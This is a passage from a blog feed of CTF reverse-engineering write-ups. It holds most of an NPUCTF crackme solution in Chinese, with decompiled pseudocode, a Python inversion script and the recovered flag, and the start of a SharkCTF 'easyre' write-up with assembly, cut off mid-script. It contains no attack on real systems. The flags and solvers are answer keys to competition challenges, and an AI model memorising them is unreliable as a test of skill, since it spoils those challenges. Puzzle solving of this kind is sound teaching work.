<span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; --i )</span><br><span class="line">          byte_4323C0[i] += v48 + *((_BYTE *)&amp;length_input + i + <span class="hljs-number">3</span>);</span><br><span class="line">        <span class="hljs-built_in">hex2str</span>((<span class="hljs-keyword">int</span>)input0, (<span class="hljs-keyword">int</span>)input_step2, length_input);</span><br><span class="line">        <span class="hljs-built_in">sub_401073</span>();</span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><p>输入进行了几步处理，然后把输入的字符16进制转成字符串存储起来，长度翻倍，最后执行了<code>sub_401073()</code>函数，跳到了这个位置</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*<span class="hljs-built_in">sub_4017A0</span>())()</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+50h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">64</span>; ++i )</span><br><span class="line">    final_target[i] = i * i;</span><br><span class="line">  <span class="hljs-keyword">return</span> off_42EA40;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>return</code>了一个偏移量，<del>发现事情并不单纯</del>，应该和上面一样又套了一层</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">void</span> *__usercall sub_401680@&lt;eax&gt;(<span class="hljs-keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+0h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">memset</span>(dword_4328C0, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(final_target, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( *(_DWORD *)(a1 - <span class="hljs-number">8</span>) = <span class="hljs-number">2</span>; *(_DWORD *)(a1 - <span class="hljs-number">8</span>) &lt;= dword_42EA30; ++*(_DWORD *)(a1 - <span class="hljs-number">8</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !dword_4328C0[*(_DWORD *)(a1 - <span class="hljs-number">8</span>)] )</span><br><span class="line">      final_target[++final_target[<span class="hljs-number">0</span>]] = *(_DWORD *)(a1 - <span class="hljs-number">8</span>);</span><br><span class="line">    <span class="hljs-keyword">for</span> ( *(_DWORD *)(a1 - <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>; *(_DWORD *)(a1 - <span class="hljs-number">4</span>) &lt;= final_target[<span class="hljs-number">0</span>]; ++*(_DWORD *)(a1 - <span class="hljs-number">4</span>) )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( final_target[*(_DWORD *)(a1 - <span class="hljs-number">4</span>)] * *(_DWORD *)(a1 - <span class="hljs-number">8</span>) &gt; dword_42EA30 )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      dword_4328C0[final_target[*(_DWORD *)(a1 - <span class="hljs-number">4</span>)] * *(_DWORD *)(a1 - <span class="hljs-number">8</span>)] = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(*(_DWORD *)(a1 - <span class="hljs-number">8</span>) % final_target[*(_DWORD *)(a1 - <span class="hljs-number">4</span>)]) )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> retaddr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>处理看起来不是很简单，但是和输入没什么关系，直接动态调试<code>dump</code>出来就行了，没什么难度</p><p>接着进行了一个逆序</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">reverse</span>((<span class="hljs-keyword">int</span>)input_step2, <span class="hljs-number">2</span> * length_input);<span class="hljs-comment">// 第四步</span></span><br></pre></td></tr></tbody></table></figure><p>接下来的几个逻辑判断判断一下就不难发现最后走的是这一部分的处理</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">else</span>                                    <span class="hljs-comment">// 第五步</span></span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * length_input; ++i )</span><br><span class="line">  {</span><br><span class="line">    v14 = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    v15 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, v14);</span><br><span class="line">    v16 = i;</span><br><span class="line">    input_step2[i] += <span class="hljs-built_in">LOBYTE</span>(tttt[i % (v15 - <span class="hljs-number">1</span>)]);</span><br><span class="line">    <span class="hljs-built_in">HIDWORD</span>(v46) = i;</span><br><span class="line">    <span class="hljs-built_in">LOBYTE</span>(v16) = input_step2[i];</span><br><span class="line">    <span class="hljs-built_in">sub_401019</span>(v16, i);</span><br><span class="line">    input_step2[i] = v17;</span><br><span class="line">    *(&amp;str2 + i) = (<span class="hljs-keyword">unsigned</span> __int8)input_step2[i] + <span class="hljs-number">2</span> * i;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>sub_401019(v16, i)</code>的内容看一下也很容易出来</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_401CD0</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1, <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ST58_4</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="hljs-built_in">sub_40101E</span>(<span class="hljs-number">4</span>) - <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> a2 % (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-built_in">sub_40101E</span>(<span class="hljs-number">3</span>) - <span class="hljs-number">2</span>) ^ target1[a2 % v2] ^ a1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>简单的两层异或，中间套了一个函数，传的是固定参数，调试很容易出来，不过这个函数也不复杂，可以直接分析出来</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">size_t</span> __cdecl <span class="hljs-title">sub_401820</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> a1 * <span class="hljs-built_in">strlen</span>(off_42EA34);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>求得是这一部分的长度</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="hljs-number">0042</span>EA34     ; <span class="hljs-keyword">char</span> *off_42EA34</span><br><span class="line">.data:<span class="hljs-number">0042</span>EA34     off_42EA34      dd offset unk_42C01C    ; DATA XREF: sub_401820+<span class="hljs-number">18</span>↑r</span><br><span class="line">.data:<span class="hljs-number">0042</span>EA38     off_42EA38      dd offset sub_401023    ; DATA XREF: sub_401950+<span class="hljs-number">7</span>C↑r</span><br><span class="line">.data:<span class="hljs-number">0042</span>EA3C     off_42EA3C      dd offset sub_401050    ; DATA XREF: sub_401A10+<span class="hljs-number">7F</span>↑r</span><br><span class="line">.data:<span class="hljs-number">0042</span>EA40     off_42EA40      dd offset sub_40103C    ; DATA XREF: sub_4017A0+<span class="hljs-number">46</span>↑r</span><br><span class="line">.data:<span class="hljs-number">0042</span>EA44                     align <span class="hljs-number">10</span>h</span><br></pre></td></tr></tbody></table></figure><p>但第一部分是数据，肯定不是整个的长度，一定有<code>\0</code>让<code>strlen</code>截断</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="hljs-number">0042</span>C01C     unk_42C01C      db  <span class="hljs-number">58</span>h ; X             ; DATA XREF: .data:off_42EA34↓o</span><br><span class="line">.rdata:<span class="hljs-number">0042</span>C01D                     db  <span class="hljs-number">58</span>h ; X</span><br><span class="line">.rdata:<span class="hljs-number">0042</span>C01E                     db    <span class="hljs-number">0</span></span><br><span class="line">.rdata:<span class="hljs-number">0042</span>C01F                     db    <span class="hljs-number">0</span></span><br></pre></td></tr></tbody></table></figure><p>发现长度为2，并且在<code>.rdata</code>段，程序运行过程中没有修改，检验一下查一查交叉引用发现果然没有，回到原来的位置，<code>sub_40101E</code>的作用很简单，就是<code>*2</code>，所以返回的值也可以写成</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">return</span> a2 % <span class="hljs-number">4</span> ^ target1[a2 % <span class="hljs-number">6</span>] ^ a1</span><br></pre></td></tr></tbody></table></figure><p>下面再稍微判断一下，永远走的是这个处理</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( v25 &gt;= <span class="hljs-built_in">pow</span>(v40 / <span class="hljs-number">2</span>, <span class="hljs-number">2</span>) )           <span class="hljs-comment">// 第六步</span></span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * length_input; ++i )</span><br><span class="line">  {</span><br><span class="line">    v26 = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    v27 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, v26);</span><br><span class="line">    *(&amp;str2 + i) *= final_target[i % (v27 - <span class="hljs-number">1</span>)];</span><br><span class="line">    v28 = <span class="hljs-built_in">pow</span>(i, <span class="hljs-number">2</span>);</span><br><span class="line">    *(&amp;str2 + i) += v28 - i;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后四位变五位</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * length_input; ++i )<span class="hljs-comment">// 第七步</span></span><br><span class="line">{</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;str1, <span class="hljs-number">0</span>, <span class="hljs-number">0x16</span>u);</span><br><span class="line">  tmp = *(&amp;str2 + i);</span><br><span class="line">  <span class="hljs-built_in">sprintf</span>(&amp;str1, <span class="hljs-string">"%05d"</span>, tmp);</span><br><span class="line">  <span class="hljs-built_in">strcat</span>(&amp;str0, &amp;str1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>几步处理之后继续16进制转字符串</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">length2 = <span class="hljs-built_in">strlen</span>(&amp;str0);</span><br><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; length2; ++i )</span><br><span class="line">{</span><br><span class="line">  v33 = <span class="hljs-built_in">tri</span>(<span class="hljs-number">1</span>);</span><br><span class="line">  v34 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, v33);</span><br><span class="line">  v35 = i % (v34 - <span class="hljs-number">1</span>);</span><br><span class="line">  *(&amp;str0 + i) += i % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) + tttt[v35];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">reverse</span>((<span class="hljs-keyword">int</span>)&amp;str0, length2);</span><br><span class="line"><span class="hljs-built_in">hex2str</span>((<span class="hljs-keyword">int</span>)&amp;str0, (<span class="hljs-keyword">int</span>)&amp;hex, length2);</span><br></pre></td></tr></tbody></table></figure><p>最后进行比较</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(</span><br><span class="line">                &amp;hex,</span><br><span class="line">                <span class="hljs-string">"3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C38"</span></span><br><span class="line">                <span class="hljs-string">"3E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C3435"</span></span><br><span class="line">                <span class="hljs-string">"35393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A"</span></span><br><span class="line">                <span class="hljs-string">"3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A"</span></span><br><span class="line">                <span class="hljs-string">"3634373D3B3632373C3B35323D373732383739353435353A3834353538343934"</span>) )</span><br><span class="line">          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PASS!\n"</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"WHAT?\n"</span>);</span><br></pre></td></tr></tbody></table></figure><p>整个过程没有什么特别复杂的处理，逆起来也没什么难度</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">finaltarget = [<span class="hljs-number">54</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">29</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">41</span>, <span class="hljs-number">43</span>, <span class="hljs-number">47</span>, <span class="hljs-number">53</span>, <span class="hljs-number">59</span>, <span class="hljs-number">61</span>, <span class="hljs-number">67</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">79</span>, <span class="hljs-number">83</span>, <span class="hljs-number">89</span>, <span class="hljs-number">97</span>, <span class="hljs-number">101</span>,</span><br><span class="line">               <span class="hljs-number">103</span>, <span class="hljs-number">107</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">127</span>, <span class="hljs-number">131</span>, <span class="hljs-number">137</span>, <span class="hljs-number">139</span>, <span class="hljs-number">149</span>, <span class="hljs-number">151</span>, <span class="hljs-number">157</span>, <span class="hljs-number">163</span>, <span class="hljs-number">167</span>, <span class="hljs-number">173</span>, <span class="hljs-number">179</span>, <span class="hljs-number">181</span>, <span class="hljs-number">191</span>, <span class="hljs-number">193</span>, <span class="hljs-number">197</span>, <span class="hljs-number">199</span>, <span class="hljs-number">211</span>,</span><br><span class="line">               <span class="hljs-number">223</span>, <span class="hljs-number">227</span>, <span class="hljs-number">229</span>, <span class="hljs-number">233</span>, <span class="hljs-number">239</span>, <span class="hljs-number">241</span>, <span class="hljs-number">251</span>]</span><br><span class="line">tttt = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]</span><br><span class="line">target1 = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>]</span><br><span class="line">final = <span class="hljs-string">"3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C383E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C343535393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A3634373D3B3632373C3B35323D373732383739353435353A3834353538343934"</span></span><br><span class="line">f = []</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(final):</span><br><span class="line">    f.append(<span class="hljs-built_in">int</span>(final[i:i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>))</span><br><span class="line">    i += <span class="hljs-number">2</span></span><br><span class="line">f.reverse()</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(f)):</span><br><span class="line">    f[i] -= i % <span class="hljs-number">4</span> + tttt[i % <span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-comment"># print(f)</span></span><br><span class="line">tmp = <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f])</span><br><span class="line"><span class="hljs-comment"># print(tmp)</span></span><br><span class="line">str2 = []</span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> j &lt; <span class="hljs-built_in">len</span>(tmp):</span><br><span class="line">    str2.append(<span class="hljs-built_in">int</span>(tmp[j:j + <span class="hljs-number">5</span>]))</span><br><span class="line">    j += <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-comment"># print(tmp_f)</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):</span><br><span class="line">    str2[i] -= (i ** <span class="hljs-number">2</span> - i)</span><br><span class="line">    str2[i] //= finaltarget[i % <span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-comment"># print(str2)</span></span><br><span class="line">input_step2 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):</span><br><span class="line">    input_step2.append((((str2[i] - <span class="hljs-number">2</span> * i) ^ (i % <span class="hljs-number">4</span>) ^ (target1[i % <span class="hljs-number">6</span>])) &amp; <span class="hljs-number">0xff</span>) - tttt[i % <span class="hljs-number">7</span>] &amp; <span class="hljs-number">0xff</span>)</span><br><span class="line">input_step2.reverse()</span><br><span class="line">input0 = <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> input_step2])</span><br><span class="line">inp = []</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(input0):</span><br><span class="line">    inp.append(<span class="hljs-built_in">int</span>(input0[i:i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>))</span><br><span class="line">    i += <span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(inp)):</span><br><span class="line">    inp[i] -= inp[i - <span class="hljs-number">1</span>]</span><br><span class="line">    inp[i] &amp;= <span class="hljs-number">0xff</span></span><br><span class="line"><span class="hljs-comment"># print([hex(i) for i in inp])</span></span><br><span class="line">inp.append(<span class="hljs-number">10</span>)</span><br><span class="line">i = <span class="hljs-built_in">len</span>(inp) - <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span>:</span><br><span class="line">    inp[i - <span class="hljs-number">1</span>] -= inp[i]</span><br><span class="line">    i -= <span class="hljs-number">1</span></span><br><span class="line">    inp[i] &amp;= <span class="hljs-number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inp) - <span class="hljs-number">1</span>):</span><br><span class="line">    inp[i] += <span class="hljs-number">32</span></span><br><span class="line">flag = <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> inp])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>最后的flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">NNPPUUCTF</span>{S<span class="hljs-number">0</span>_M<span class="hljs-number">4</span>NY_BUG<span class="hljs-number">5</span>!}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> NPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharkCTF-wp</title>
      <link href="/2020/03/21/2020-SharkCTF/"/>
      <url>/2020/03/21/2020-SharkCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>SharkCTF-wp</p><span id="more"></span><h4 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h4><h5 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h5><p>An easy asm, as we can see, every single <code>byte</code> in <code>the_second_array</code> is xored, and then plus the <code>byte</code> with the same index in <code>some_array</code></p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line"></span><br><span class="line">SECTION .rodata</span><br><span class="line">some_array db 10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24</span><br><span class="line">the_second_array db 0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf</span><br><span class="line">len_second_array equ $ - the_second_array</span><br><span class="line">SECTION .text</span><br><span class="line">    GLOBAL main</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">mov rdx, [rsp]</span><br><span class="line">cmp rdx, 2</span><br><span class="line">jne exit</span><br><span class="line">mov rsi, [rsp+0x10]</span><br><span class="line">mov rdx, rsi</span><br><span class="line">mov rcx, 0</span><br><span class="line">l1:</span><br><span class="line">cmp byte [rdx], 0</span><br><span class="line">je follow_the_label</span><br><span class="line">inc rcx</span><br><span class="line">inc rdx</span><br><span class="line">jmp l1</span><br><span class="line">follow_the_label:</span><br><span class="line">mov al, byte [rsi+rcx-1]</span><br><span class="line">mov rdi,  some_array</span><br><span class="line">mov rdi, [rdi+rcx-1]</span><br><span class="line">add al, dil</span><br><span class="line">xor rax, 42</span><br><span class="line">mov r10, the_second_array</span><br><span class="line">add r10, rcx</span><br><span class="line">dec r10</span><br><span class="line">cmp al, byte [r10]</span><br><span class="line">jne exit</span><br><span class="line">dec rcx</span><br><span class="line">cmp rcx, 0</span><br><span class="line">jne follow_the_label</span><br><span class="line">win:</span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br><span class="line">exit:</span><br><span class="line">mov rdi, 0</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure><p>So it’s easy to solve it with python using simple script blow</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">target=[<span class="hljs-number">0x57</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x12</span>,<span 